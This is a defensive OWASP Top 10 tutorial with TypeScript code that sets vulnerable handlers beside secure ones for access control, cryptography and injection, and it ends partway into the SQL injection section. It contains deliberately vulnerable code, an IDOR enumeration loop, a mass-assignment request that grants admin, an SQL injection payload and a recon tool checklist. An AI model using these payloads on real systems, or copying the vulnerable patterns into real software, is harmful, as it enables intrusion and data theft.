# 🛡️ OWASP Top 10 - Complete Guide (Expanded)

> The definitive guide to the OWASP Top 10 security vulnerabilities - comprehensive coverage of XSS, CSRF, injection, broken authentication, security misconfiguration, with production code, attack scenarios, and defense strategies.

---

## Part 1: Must Remember + Core Concepts

### 🧠 MUST REMEMBER TO IMPRESS

#### 1-Liner Definition
> "OWASP Top 10 is the authoritative list of the most critical web application security risks, updated every few years based on real-world vulnerability data from hundreds of organizations - knowing these is the absolute minimum bar for any developer claiming to write secure code."

#### The "Wow" Statement
> "In my security audit of our platform, I systematically tested for all OWASP Top 10 vulnerabilities. I found 4 issues: Broken Access Control (users could access other users' data by manipulating IDs in URLs - IDOR), Injection (a legacy endpoint used string concatenation in SQL), Security Misconfiguration (verbose error messages exposing stack traces and database schema), and Cryptographic Failures (passwords were hashed with SHA-256 without salt). I implemented fixes: parameterized queries for all database operations, authorization middleware that validates resource ownership on every request, environment-specific error handling, and migrated password hashing to Argon2id. Post-remediation, we passed a third-party penetration test with zero high/critical findings. The key insight: 90% of vulnerabilities come from missing checks rather than sophisticated exploits."

#### Key Statistics to Remember
- **94%** of applications have some form of broken access control
- **Injection** dropped from #1 to #3 (better awareness, but still critical)
- **3 NEW categories** in 2021: Insecure Design, Integrity Failures, SSRF
- Average cost of a data breach: **$4.45 million** (2023)
- **83%** of web applications have at least one vulnerability

### OWASP Top 10 - 2021 Overview

```
OWASP TOP 10 - 2021 EDITION:
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│  A01: BROKEN ACCESS CONTROL (was #5 → now #1)                              │
│  ══════════════════════════════════════════════                             │
│  • 94% of applications tested had some form                                │
│  • IDOR, privilege escalation, CORS misconfig                              │
│  • Most common and most critical                                           │
│                                                                              │
│  A02: CRYPTOGRAPHIC FAILURES (was "Sensitive Data Exposure")               │
│  ═══════════════════════════════════════════════════════════                │
│  • Weak encryption, exposed secrets, plain text storage                    │
│  • Missing TLS, weak algorithms (MD5, SHA1)                                │
│                                                                              │
│  A03: INJECTION (was #1 → now #3)                                          │
│  ════════════════════════════════                                           │
│  • SQL, NoSQL, OS command, LDAP, XPath injection                          │
│  • Still devastating but better understood                                 │
│                                                                              │
│  A04: INSECURE DESIGN (NEW in 2021)                                        │
│  ═══════════════════════════════════                                        │
│  • Missing security controls BY DESIGN                                     │
│  • No amount of implementation fixes bad design                            │
│                                                                              │
│  A05: SECURITY MISCONFIGURATION (was #6)                                   │
│  ═══════════════════════════════════════                                    │
│  • Default credentials, unnecessary features                               │
│  • Verbose errors, missing security headers                                │
│                                                                              │
│  A06: VULNERABLE AND OUTDATED COMPONENTS (was #9)                          │
│  ════════════════════════════════════════════════                           │
│  • Known CVEs in dependencies                                              │
│  • npm audit, Snyk, Dependabot                                             │
│                                                                              │
│  A07: IDENTIFICATION AND AUTHENTICATION FAILURES (was #2)                  │
│  ═══════════════════════════════════════════════════════════                │
│  • Weak passwords, credential stuffing                                     │
│  • Session fixation, missing MFA                                           │
│                                                                              │
│  A08: SOFTWARE AND DATA INTEGRITY FAILURES (NEW)                           │
│  ══════════════════════════════════════════════════                         │
│  • CI/CD pipeline attacks, unsigned updates                                │
│  • Insecure deserialization                                                │
│                                                                              │
│  A09: SECURITY LOGGING AND MONITORING FAILURES (was #10)                   │
│  ═══════════════════════════════════════════════════════                    │
│  • Missing audit logs, no alerting                                         │
│  • Can't detect breaches                                                   │
│                                                                              │
│  A10: SERVER-SIDE REQUEST FORGERY - SSRF (NEW)                             │
│  ═════════════════════════════════════════════                              │
│  • Server fetches attacker-controlled URLs                                 │
│  • Access internal services, cloud metadata                                │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Attack Vector Visualization

```
ATTACK SURFACE MAP:
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│                              INTERNET                                        │
│                                 │                                            │
│                    ┌────────────┴────────────┐                              │
│                    │       ENTRY POINTS       │                              │
│                    └────────────┬────────────┘                              │
│                                 │                                            │
│    ┌──────────────┬─────────────┼─────────────┬──────────────┐              │
│    ▼              ▼             ▼             ▼              ▼              │
│ ┌──────┐    ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│ │ URLs │    │  Forms   │  │   APIs   │  │ Headers  │  │ Cookies  │        │
│ └──┬───┘    └────┬─────┘  └────┬─────┘  └────┬─────┘  └────┬─────┘        │
│    │             │             │             │              │               │
│    │    ┌────────┴─────────────┴─────────────┴──────────────┘               │
│    │    │                                                                    │
│    ▼    ▼                                                                    │
│ ┌─────────────────────────────────────────────────────────────┐            │
│ │                    APPLICATION LAYER                         │            │
│ │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │            │
│ │  │ Auth (A07)  │  │ Access(A01) │  │ Input Handling(A03) │  │            │
│ │  └─────────────┘  └─────────────┘  └─────────────────────┘  │            │
│ └─────────────────────────────────────────────────────────────┘            │
│                              │                                              │
│                              ▼                                              │
│ ┌─────────────────────────────────────────────────────────────┐            │
│ │                      DATA LAYER                              │            │
│ │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │            │
│ │  │Database(A03)│  │ Files(A01)  │  │ Secrets (A02)       │  │            │
│ │  └─────────────┘  └─────────────┘  └─────────────────────┘  │            │
│ └─────────────────────────────────────────────────────────────┘            │
│                              │                                              │
│                              ▼                                              │
│ ┌─────────────────────────────────────────────────────────────┐            │
│ │                   INFRASTRUCTURE                             │            │
│ │  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │            │
│ │  │Config (A05) │  │ Deps (A06)  │  │ Cloud Meta (A10)    │  │            │
│ │  └─────────────┘  └─────────────┘  └─────────────────────┘  │            │
│ └─────────────────────────────────────────────────────────────┘            │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Impact Severity Matrix

```
IMPACT BY VULNERABILITY TYPE:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  ████████████████████████████████████████  CRITICAL (RCE/Full Compromise)  │
│  ├── SQL Injection → Database dump, data deletion, RCE                    │
│  ├── Command Injection → Server takeover, lateral movement                │
│  ├── SSRF → AWS credentials theft, internal network access                │
│  ├── Deserialization → Remote code execution                              │
│  └── Auth Bypass → Complete account takeover                              │
│                                                                             │
│  ██████████████████████████████           HIGH (Data Breach/Takeover)      │
│  ├── Broken Access Control → Access all user data                         │
│  ├── Authentication Failures → Account takeover                           │
│  ├── Cryptographic Failures → Credential/PII exposure                     │
│  ├── Stored XSS → Session hijacking at scale                              │
│  └── XXE → Internal file disclosure                                       │
│                                                                             │
│  ████████████████████                     MEDIUM (Limited Exposure)        │
│  ├── CSRF → Unauthorized actions as victim                                │
│  ├── Reflected XSS → Targeted phishing attacks                            │
│  ├── Information Disclosure → Reconnaissance data                         │
│  └── Open Redirect → Phishing amplification                               │
│                                                                             │
│  ██████████                               LOW (Reconnaissance/Nuisance)    │
│  ├── Missing Security Headers → Easier exploitation                       │
│  ├── Verbose Errors → Information gathering                               │
│  └── Version Disclosure → Known CVE targeting                             │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
```

### Security Mindset: Think Like an Attacker

```typescript
// ════════════════════════════════════════════════════════════════════════════
// THE ATTACKER'S METHODOLOGY (OWASP Testing Guide)
// ════════════════════════════════════════════════════════════════════════════

/*
RECONNAISSANCE PHASE:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  1. PASSIVE RECONNAISSANCE                                                 │
│     • Google dorks: site:target.com filetype:pdf                          │
│     • Wayback Machine: historical endpoints                               │
│     • GitHub: leaked credentials, API keys                                │
│     • LinkedIn: employee names for username enumeration                   │
│     • Shodan: exposed services, versions                                  │
│                                                                             │
│  2. ACTIVE RECONNAISSANCE                                                  │
│     • Subdomain enumeration: subfinder, amass                             │
│     • Port scanning: nmap                                                 │
│     • Directory bruteforce: dirsearch, gobuster                           │
│     • Technology fingerprinting: Wappalyzer, whatweb                      │
│     • API endpoint discovery: /swagger, /api-docs, /graphql               │
│                                                                             │
│  3. VULNERABILITY SCANNING                                                 │
│     • OWASP ZAP automated scan                                            │
│     • Burp Suite active scan                                              │
│     • Nuclei templates                                                    │
│     • nikto for web servers                                               │
│                                                                             │
│  4. MANUAL TESTING (Most Effective)                                        │
│     • Test EVERY parameter                                                │
│     • Test EVERY endpoint with different auth levels                      │
│     • Test edge cases: negative numbers, null bytes, Unicode              │
│     • Test business logic: can I skip steps? repeat steps?                │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// What attackers look for in YOUR code:
const attackerChecklist = {
    // 1. Authentication Weaknesses
    auth: [
        'Default credentials',
        'Weak password policy',
        'No rate limiting on login',
        'Password reset token predictability',
        'Session fixation',
        'JWT algorithm confusion'
    ],
    
    // 2. Authorization Gaps
    authz: [
        'IDOR - changing IDs in URLs/params',
        'Missing function-level access control',
        'Privilege escalation via role manipulation',
        'Horizontal access to other users data',
        'Vertical access to admin functions'
    ],
    
    // 3. Injection Points
    injection: [
        'Search boxes → SQL injection',
        'File upload names → Command injection',
        'Headers → Log injection, CRLF',
        'JSON input → NoSQL injection',
        'XML input → XXE'
    ],
    
    // 4. Information Leakage
    infoLeak: [
        'Error messages with stack traces',
        'API responses with internal fields',
        'Comments in HTML/JS with secrets',
        'Directory listings',
        '.git folder exposed'
    ],
    
    // 5. Business Logic Flaws
    businessLogic: [
        'Race conditions in payments',
        'Negative quantity/price manipulation',
        'Coupon/discount abuse',
        'Skip workflow steps',
        'Time-of-check-time-of-use (TOCTOU)'
    ]
};
```

### Defense in Depth Principle

```
DEFENSE IN DEPTH LAYERS:
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                              │
│  Layer 1: PERIMETER                                                         │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │  • WAF (Web Application Firewall)                                     │  │
│  │  • DDoS protection (Cloudflare, AWS Shield)                          │  │
│  │  • Rate limiting at edge                                              │  │
│  │  • IP reputation blocking                                             │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  Layer 2: NETWORK                                                           │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │  • TLS 1.3 everywhere                                                 │  │
│  │  • Network segmentation                                               │  │
│  │  • Private subnets for databases                                      │  │
│  │  • VPC/firewall rules                                                 │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  Layer 3: APPLICATION                                                        │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │  • Input validation (Zod, Joi)                                        │  │
│  │  • Output encoding                                                    │  │
│  │  • Authentication & Authorization                                     │  │
│  │  • Security headers (CSP, HSTS)                                       │  │
│  │  • Session management                                                 │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  Layer 4: DATA                                                              │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │  • Encryption at rest (AES-256)                                       │  │
│  │  • Encryption in transit (TLS)                                        │  │
│  │  • Parameterized queries                                              │  │
│  │  • Data masking/tokenization                                          │  │
│  │  • Field-level encryption for PII                                     │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  Layer 5: MONITORING                                                         │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │  • Security event logging                                             │  │
│  │  • Anomaly detection                                                  │  │
│  │  • Alerting (PagerDuty, OpsGenie)                                    │  │
│  │  • Incident response plan                                             │  │
│  │  • Regular audits                                                     │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘

KEY PRINCIPLE: Each layer should be able to stop an attack independently.
If one layer fails, others still protect.
```

---

*Part 1 Complete. Continue to Part 2 for detailed vulnerability patterns and defense code.*

# OWASP Top 10 - Part 2: Detailed Vulnerability Patterns & Defense Code

## A01: Broken Access Control (CRITICAL - #1 Vulnerability)

### Understanding the Attack Surface

```typescript
// ════════════════════════════════════════════════════════════════════════════
// BROKEN ACCESS CONTROL - THE #1 VULNERABILITY (94% of apps affected)
// ════════════════════════════════════════════════════════════════════════════

/*
ACCESS CONTROL FAILURE TYPES:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  1. VERTICAL PRIVILEGE ESCALATION                                          │
│     Regular user → Admin functionality                                     │
│     Example: /admin/users accessible without admin role                   │
│                                                                             │
│  2. HORIZONTAL PRIVILEGE ESCALATION                                        │
│     User A → User B's data                                                │
│     Example: /api/users/123/orders → /api/users/456/orders                │
│                                                                             │
│  3. INSECURE DIRECT OBJECT REFERENCE (IDOR)                               │
│     Predictable resource identifiers                                       │
│     Example: /invoices/1, /invoices/2, /invoices/3                        │
│                                                                             │
│  4. MISSING FUNCTION-LEVEL ACCESS CONTROL                                  │
│     API endpoints without authorization                                    │
│     Example: DELETE /api/posts/{id} - no ownership check                  │
│                                                                             │
│  5. METADATA MANIPULATION                                                  │
│     Tampering with tokens, cookies, hidden fields                         │
│     Example: Modifying JWT claims, changing role in request               │
│                                                                             │
│  6. CORS MISCONFIGURATION                                                  │
│     Overly permissive cross-origin policies                               │
│     Example: Access-Control-Allow-Origin: *                               │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/
```

### Attack Pattern 1: IDOR (Insecure Direct Object Reference)

```typescript
// ──────────────────────────────────────────────────────────────────────────
// IDOR - THE MOST COMMON ACCESS CONTROL VULNERABILITY
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE: No authorization check
app.get('/api/invoices/:id', async (req, res) => {
    const invoice = await db.invoices.findById(req.params.id);
    res.json(invoice);  // Anyone can access ANY invoice by guessing IDs!
});

// ATTACK SCENARIO:
// 1. User logs in, views their invoice at /api/invoices/1001
// 2. User changes URL to /api/invoices/1000, /api/invoices/999...
// 3. Gets access to ALL invoices in the system
// 4. Automated: for(i=1; i<10000; i++) fetch(`/api/invoices/${i}`)

// ✅ SECURE: Authorization check with ownership verification
app.get('/api/invoices/:id', authenticate, async (req, res) => {
    const invoice = await db.invoices.findById(req.params.id);
    
    // Check 1: Resource exists
    if (!invoice) {
        return res.status(404).json({ error: 'Invoice not found' });
    }
    
    // Check 2: User owns this resource OR is admin
    const isOwner = invoice.userId === req.user.id;
    const isAdmin = req.user.role === 'admin';
    const isAccountant = req.user.role === 'accountant' && 
                         invoice.companyId === req.user.companyId;
    
    if (!isOwner && !isAdmin && !isAccountant) {
        // Log potential attack
        logger.warn('IDOR attempt detected', {
            userId: req.user.id,
            attemptedResource: req.params.id,
            resourceType: 'invoice',
            ip: req.ip,
            userAgent: req.headers['user-agent']
        });
        
        // Return 404, not 403 (don't confirm resource exists)
        return res.status(404).json({ error: 'Invoice not found' });
    }
    
    res.json(invoice);
});

// ✅ EVEN BETTER: Query with ownership built-in
app.get('/api/invoices/:id', authenticate, async (req, res) => {
    // Include ownership in the query itself
    const invoice = await db.invoices.findFirst({
        where: {
            id: req.params.id,
            OR: [
                { userId: req.user.id },
                { companyId: req.user.companyId, visibility: 'company' }
            ]
        }
    });
    
    if (!invoice) {
        return res.status(404).json({ error: 'Invoice not found' });
    }
    
    res.json(invoice);
});
```

### Attack Pattern 2: Privilege Escalation

```typescript
// ──────────────────────────────────────────────────────────────────────────
// PRIVILEGE ESCALATION - User becomes Admin
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE: Role in request body
app.post('/api/users', async (req, res) => {
    const { email, password, name, role } = req.body;
    
    const user = await db.users.create({
        data: { email, password: await hash(password), name, role }
    });
    
    res.json(user);
});

// ATTACK: POST /api/users
// Body: { email: "attacker@evil.com", password: "...", name: "Attacker", role: "admin" }
// Result: Attacker creates admin account!

// ✅ SECURE: Server-controlled role assignment
app.post('/api/users', async (req, res) => {
    const { email, password, name } = req.body;
    
    // Role is NEVER from request - always server-controlled
    const user = await db.users.create({
        data: { 
            email, 
            password: await hash(password), 
            name, 
            role: 'user'  // Always default role
        }
    });
    
    res.json(user);
});

// For admin to change roles:
app.patch('/api/users/:id/role', 
    authenticate, 
    requireRole('admin'),
    async (req, res) => {
        const { role } = req.body;
        
        // Validate role is allowed
        const allowedRoles = ['user', 'moderator', 'admin'];
        if (!allowedRoles.includes(role)) {
            return res.status(400).json({ error: 'Invalid role' });
        }
        
        // Prevent removing last admin
        if (role !== 'admin') {
            const adminCount = await db.users.count({ where: { role: 'admin' } });
        const targetUser = await db.users.findById(req.params.id);
            if (targetUser.role === 'admin' && adminCount <= 1) {
                return res.status(400).json({ error: 'Cannot remove last admin' });
            }
        }
        
        // Audit log
        await auditLog.create({
            action: 'ROLE_CHANGE',
            performedBy: req.user.id,
            targetUser: req.params.id,
            oldRole: targetUser.role,
            newRole: role
        });
        
        await db.users.update({
            where: { id: req.params.id },
            data: { role }
        });
        
        res.json({ success: true });
    }
);
```

### Attack Pattern 3: Parameter Tampering

```typescript
// ──────────────────────────────────────────────────────────────────────────
// PARAMETER TAMPERING - Client controls server-side values
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE: Price from client
app.post('/api/orders', authenticate, async (req, res) => {
    const { productId, quantity, price, discount, userId } = req.body;
    
    await db.orders.create({
        data: {
        productId,
        quantity,
            price,        // ❌ Client controls price!
            discount,     // ❌ Client controls discount!
            userId        // ❌ Client controls userId!
        }
    });
});

// ATTACK SCENARIOS:
// 1. Price manipulation: { productId: 1, quantity: 1, price: 0.01 }
// 2. Discount abuse: { productId: 1, quantity: 1, price: 100, discount: 99.99 }
// 3. Order as another user: { productId: 1, userId: "victim-id" }

// ✅ SECURE: Server-derived values
app.post('/api/orders', authenticate, async (req, res) => {
    const { productId, quantity, couponCode } = req.body;
    
    // Validate input
    if (!Number.isInteger(quantity) || quantity < 1 || quantity > 100) {
        return res.status(400).json({ error: 'Invalid quantity' });
    }
    
    // Server-side product lookup
    const product = await db.products.findById(productId);
    if (!product || !product.available) {
        return res.status(404).json({ error: 'Product not found' });
    }
    
    // Check stock
    if (quantity > product.stock) {
        return res.status(400).json({ error: 'Insufficient stock' });
    }
    
    // Server-side discount calculation
    let discount = 0;
    if (couponCode) {
        const coupon = await validateCoupon(couponCode, req.user.id, productId);
        if (coupon.valid) {
            discount = coupon.discountAmount;
        }
    }
    
    // Calculate totals server-side
    const subtotal = product.price * quantity;
    const total = Math.max(0, subtotal - discount);  // Never negative
    
    await db.orders.create({
        data: {
        productId,
        quantity,
            unitPrice: product.price,     // ✅ From database
            discount,                      // ✅ Server-calculated
            total,                         // ✅ Server-calculated
            userId: req.user.id           // ✅ From authenticated session
        }
    });
});
```

### Comprehensive Access Control Middleware

```typescript
// ──────────────────────────────────────────────────────────────────────────
// PRODUCTION-READY ACCESS CONTROL SYSTEM
// ──────────────────────────────────────────────────────────────────────────

// Types
interface Permission {
    resource: string;
    action: 'create' | 'read' | 'update' | 'delete' | 'list';
    conditions?: {
        ownershipField?: string;
        tenantField?: string;
        customCheck?: (req: Request, resource: any) => boolean;
    };
}

interface Role {
    name: string;
    permissions: Permission[];
    inherits?: string[];
}

// Role definitions
const roles: Record<string, Role> = {
    user: {
        name: 'user',
        permissions: [
            { resource: 'profile', action: 'read', conditions: { ownershipField: 'userId' } },
            { resource: 'profile', action: 'update', conditions: { ownershipField: 'userId' } },
            { resource: 'orders', action: 'read', conditions: { ownershipField: 'userId' } },
            { resource: 'orders', action: 'create' },
            { resource: 'orders', action: 'list', conditions: { ownershipField: 'userId' } },
        ]
    },
    moderator: {
        name: 'moderator',
        inherits: ['user'],
        permissions: [
            { resource: 'posts', action: 'update' },
            { resource: 'posts', action: 'delete' },
            { resource: 'comments', action: 'delete' },
        ]
    },
    admin: {
        name: 'admin',
        inherits: ['moderator'],
        permissions: [
            { resource: '*', action: '*' as any },  // Full access
        ]
    }
};

// Get all permissions for a role (including inherited)
function getRolePermissions(roleName: string): Permission[] {
    const role = roles[roleName];
    if (!role) return [];
    
    let permissions = [...role.permissions];
    
    if (role.inherits) {
        for (const inheritedRole of role.inherits) {
            permissions = [...permissions, ...getRolePermissions(inheritedRole)];
        }
    }
    
    return permissions;
}

// Check if user has permission
function hasPermission(
    userRole: string, 
    resource: string, 
    action: string
): Permission | null {
    const permissions = getRolePermissions(userRole);
    
    return permissions.find(p => 
        (p.resource === resource || p.resource === '*') &&
        (p.action === action || p.action === '*' as any)
    ) || null;
}

// Access control middleware factory
function authorize(resource: string, action: Permission['action']) {
    return async (req: Request, res: Response, next: NextFunction) => {
        // 1. Must be authenticated
        if (!req.user) {
            return res.status(401).json({ error: 'Authentication required' });
        }
        
        // 2. Check permission exists for role
        const permission = hasPermission(req.user.role, resource, action);
        if (!permission) {
            logger.warn('Authorization failed - no permission', {
                userId: req.user.id,
                role: req.user.role,
                resource,
                action,
                path: req.path
            });
            return res.status(403).json({ error: 'Permission denied' });
        }
        
        // 3. For read/update/delete, check ownership if required
        if (['read', 'update', 'delete'].includes(action) && permission.conditions) {
            const resourceId = req.params.id;
            if (resourceId) {
                const resourceData = await getResource(resource, resourceId);
            
            if (!resourceData) {
                return res.status(404).json({ error: 'Resource not found' });
            }
            
                // Check ownership
                if (permission.conditions.ownershipField) {
                    const ownerId = resourceData[permission.conditions.ownershipField];
                    if (ownerId !== req.user.id) {
                        logger.warn('Authorization failed - ownership check', {
                    userId: req.user.id,
                            resourceOwnerId: ownerId,
                    resource,
                            resourceId
                        });
                        return res.status(404).json({ error: 'Resource not found' });
                    }
                }
                
                // Check tenant
                if (permission.conditions.tenantField) {
                    const tenantId = resourceData[permission.conditions.tenantField];
                    if (tenantId !== req.user.tenantId) {
                        return res.status(404).json({ error: 'Resource not found' });
                    }
                }
                
                // Custom check
                if (permission.conditions.customCheck) {
                    if (!permission.conditions.customCheck(req, resourceData)) {
                return res.status(403).json({ error: 'Access denied' });
                    }
                }
                
                // Attach resource to request for handler
                req.resource = resourceData;
            }
        }
        
        next();
    };
}

// Usage
app.get('/api/orders/:id', 
    authenticate,
    authorize('orders', 'read'),
    async (req, res) => {
        // req.resource already loaded and authorized
        res.json(req.resource);
    }
);

app.delete('/api/posts/:id',
    authenticate,
    authorize('posts', 'delete'),
    async (req, res) => {
        await db.posts.delete({ where: { id: req.params.id } });
        res.json({ success: true });
    }
);
```

---

## A02: Cryptographic Failures

### Password Storage Deep Dive

```typescript
// ════════════════════════════════════════════════════════════════════════════
// CRYPTOGRAPHIC FAILURES - Password Hashing
// ════════════════════════════════════════════════════════════════════════════

/*
HASHING ALGORITHM COMPARISON:
┌────────────────────────────────────────────────────────────────────────────┐
│ Algorithm    │ Speed        │ Security │ Use Case                         │
├──────────────┼──────────────┼──────────┼──────────────────────────────────┤
│ MD5          │ 10B/sec      │ ❌ BROKEN │ NEVER for passwords              │
│ SHA-1        │ 5B/sec       │ ❌ BROKEN │ NEVER for passwords              │
│ SHA-256      │ 3B/sec       │ ⚠️ FAST   │ Data integrity, NOT passwords   │
│ bcrypt       │ 10K/sec      │ ✅ GOOD   │ Good default                     │
│ scrypt       │ 1K/sec       │ ✅ BETTER │ Memory-hard                      │
│ Argon2id     │ 100/sec      │ ✅ BEST   │ Modern recommended               │
└────────────────────────────────────────────────────────────────────────────┘

GPU cracking speeds (RTX 4090):
- MD5: 165 billion/sec
- SHA-256: 22 billion/sec  
- bcrypt (cost 12): 184K/sec
- Argon2id: Depends on memory (64MB = very slow)
*/

// ❌ VULNERABLE: Plain text (Obviously terrible)
const user = { email, password };  // NEVER!

// ❌ VULNERABLE: Fast hash
import crypto from 'crypto';
const hash = crypto.createHash('sha256').update(password).digest('hex');
// Problem: Attacker with rainbow table cracks instantly
// Problem: GPU can try billions per second

// ❌ VULNERABLE: Hash without salt
const hash = crypto.createHash('sha256').update(password).digest('hex');
// Problem: Same password = same hash
// Problem: Rainbow table attack works

// ⚠️ ACCEPTABLE: bcrypt (still good)
import bcrypt from 'bcrypt';

async function hashPasswordBcrypt(password: string): Promise<string> {
    const saltRounds = 12;  // 2^12 = 4096 iterations
    return bcrypt.hash(password, saltRounds);
}

async function verifyPasswordBcrypt(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
}

// ✅ BEST: Argon2id (2015 Password Hashing Competition winner)
import argon2 from 'argon2';

async function hashPassword(password: string): Promise<string> {
    return argon2.hash(password, {
        type: argon2.argon2id,     // Hybrid (resists GPU + side-channel)
        memoryCost: 65536,         // 64 MB memory required
        timeCost: 3,               // 3 iterations
        parallelism: 4,            // 4 parallel threads
        hashLength: 32             // 256-bit output
    });
}

async function verifyPassword(password: string, hash: string): Promise<boolean> {
    try {
        return await argon2.verify(hash, password);
    } catch {
        return false;  // Invalid hash format
    }
}

// Full registration flow
async function registerUser(email: string, password: string) {
    // 1. Validate password strength
    const passwordErrors = validatePasswordStrength(password);
    if (passwordErrors.length > 0) {
        throw new ValidationError('Weak password', passwordErrors);
    }
    
    // 2. Check if password is in breach database
    const isBreached = await checkHaveIBeenPwned(password);
    if (isBreached) {
        throw new ValidationError('Password found in data breach');
    }
    
    // 3. Hash password
    const passwordHash = await hashPassword(password);
    
    // 4. Create user
    const user = await db.users.create({
        data: {
            email: email.toLowerCase().trim(),
            passwordHash,
            // Never store plain password anywhere!
        }
    });
    
    return user;
}

// Check against HaveIBeenPwned (k-anonymity model - safe)
async function checkHaveIBeenPwned(password: string): Promise<boolean> {
    const sha1 = crypto.createHash('sha1').update(password).digest('hex').toUpperCase();
    const prefix = sha1.substring(0, 5);
    const suffix = sha1.substring(5);
    
    const response = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
    const text = await response.text();
    
    // API returns list of suffixes, check if ours is there
    return text.includes(suffix);
}
```

### Encryption Best Practices

```typescript
// ════════════════════════════════════════════════════════════════════════════
// ENCRYPTION - Data at Rest and in Transit
// ════════════════════════════════════════════════════════════════════════════

import crypto from 'crypto';

// ❌ VULNERABLE: ECB mode (patterns visible)
// ❌ VULNERABLE: Static IV (predictable)
// ❌ VULNERABLE: No authentication (tampering possible)

// ✅ SECURE: AES-256-GCM (Authenticated Encryption)
class SecureEncryption {
    private readonly algorithm = 'aes-256-gcm';
    private readonly keyLength = 32;  // 256 bits
    private readonly ivLength = 12;   // 96 bits for GCM
    private readonly tagLength = 16;  // 128 bits
    
    constructor(private key: Buffer) {
        if (key.length !== this.keyLength) {
            throw new Error(`Key must be ${this.keyLength} bytes`);
        }
    }
    
    // Generate a secure key
    static generateKey(): Buffer {
        return crypto.randomBytes(32);
    }
    
    // Encrypt with random IV
    encrypt(plaintext: string): string {
        // Random IV for each encryption
        const iv = crypto.randomBytes(this.ivLength);
        
        const cipher = crypto.createCipheriv(this.algorithm, this.key, iv, {
            authTagLength: this.tagLength
        });
        
        let encrypted = cipher.update(plaintext, 'utf8', 'base64');
        encrypted += cipher.final('base64');
        
        // Get authentication tag
        const authTag = cipher.getAuthTag();
        
        // Combine: IV + AuthTag + Ciphertext
        const combined = Buffer.concat([
            iv,
            authTag,
            Buffer.from(encrypted, 'base64')
        ]);
        
        return combined.toString('base64');
    }
    
    // Decrypt and verify authenticity
    decrypt(encryptedData: string): string {
        const combined = Buffer.from(encryptedData, 'base64');
        
        // Extract components
        const iv = combined.subarray(0, this.ivLength);
        const authTag = combined.subarray(this.ivLength, this.ivLength + this.tagLength);
        const ciphertext = combined.subarray(this.ivLength + this.tagLength);
        
        const decipher = crypto.createDecipheriv(this.algorithm, this.key, iv, {
            authTagLength: this.tagLength
        });
        decipher.setAuthTag(authTag);
        
        let decrypted = decipher.update(ciphertext);
        decrypted = Buffer.concat([decrypted, decipher.final()]);
        
        return decrypted.toString('utf8');
    }
}

// Usage for PII encryption
class PIIEncryption {
    private encryption: SecureEncryption;
    
    constructor() {
        // Key from environment (stored in secrets manager)
        const key = Buffer.from(process.env.PII_ENCRYPTION_KEY!, 'base64');
        this.encryption = new SecureEncryption(key);
    }
    
    encryptSSN(ssn: string): string {
        return this.encryption.encrypt(ssn);
    }
    
    decryptSSN(encrypted: string): string {
        return this.encryption.decrypt(encrypted);
    }
    
    // Searchable encryption (for queries)
    // Store both encrypted value and blind index
    encryptWithIndex(value: string): { encrypted: string; blindIndex: string } {
        const encrypted = this.encryption.encrypt(value);
        
        // Blind index: HMAC for equality search (can't decrypt, but can match)
        const blindIndex = crypto
            .createHmac('sha256', process.env.BLIND_INDEX_KEY!)
            .update(value.toLowerCase())
            .digest('hex')
            .substring(0, 16);  // Truncate for k-anonymity
        
        return { encrypted, blindIndex };
    }
}

// Database model with encrypted PII
interface UserWithEncryptedPII {
    id: string;
    email: string;
    name: string;
    
    // Encrypted fields
    ssnEncrypted: string;
    ssnBlindIndex: string;  // For searching
    
    // Encryption metadata
    encryptionKeyId: string;  // For key rotation
}
```

---

## A03: Injection

### SQL Injection Complete Guide

```typescript
// ════════════════════════════════════════════════════════════════════════════
// SQL INJECTION - From Basic to Advanced
// ════════════════════════════════════════════════════════════════════════════

/*
SQL INJECTION TYPES:
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│  1. IN-BAND SQLi (Classic)                                                 │
│     • UNION-based: Combine results with another query                     │
│     • Error-based: Extract data from error messages                       │
│                                                                             │
│  2. BLIND SQLi                                                             │
│     • Boolean-based: True/false responses                                 │
│     • Time-based: SLEEP() to infer data                                   │
│                                                                             │
│  3. OUT-OF-BAND SQLi                                                       │
│     • DNS exfiltration                                                    │
│     • HTTP requests from database                                         │
│                                                                             │
└────────────────────────────────────────────────────────────────────────────┘
*/

// ──────────────────────────────────────────────────────────────────────────
// ATTACK DEMONSTRATIONS
// ──────────────────────────────────────────────────────────────────────────

// ❌ VULNERABLE CODE
app.get('/api/users', async (req, res) => {
    const { search } = req.query;
    const query = `SELECT * FROM users WHERE name LIKE '%${search}%'`;
    const result = await db.raw(query);
    res.json(result);
});

// ATTACK 1: Basic extraction
// search = ' OR '1'='1
// Query: SELECT * FROM users WHERE name LIKE '%' OR '1'='1%'
